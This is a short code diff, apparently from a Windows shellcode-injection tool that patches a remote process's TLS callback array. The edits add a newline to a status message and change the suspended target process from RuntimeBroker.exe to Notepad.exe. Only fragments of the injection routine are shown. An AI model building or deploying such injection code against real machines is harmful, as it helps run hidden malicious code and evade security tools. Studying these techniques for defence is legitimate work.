@@ -350,7 +350,7 @@ BOOL ChangeRemoteTLSCallbackArray(IN HANDLE hProcess, IN HANDLE hThread, IN PBYT
     printf("[#] Press <ENTER> To Continue ... ");
     getchar();
 
-    printf("[i] Patching First Shellcode ... ");
+    printf("[i] Patching First Shellcode ...\n");
     if (!PatchShellcode(hProcess, (ULONG_PTR)pImgTlsCallback)) {
         goto _END_OF_FUNC;
     }
@@ -398,7 +398,7 @@ unsigned char rawData[] = {
 
 int main() {
     PROCESS_INFORMATION	ProcessInfo		= { 0x00 };
-    WCHAR			szProcessName[]		= L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";
+    WCHAR			szProcessName[]		= L"C:\\Windows\\System32\\Notepad.exe";
 
     // Create a suspended process
     if (!CreateProcessViaWinAPIsW(szProcessName, CREATE_SUSPENDED, &ProcessInfo)) {
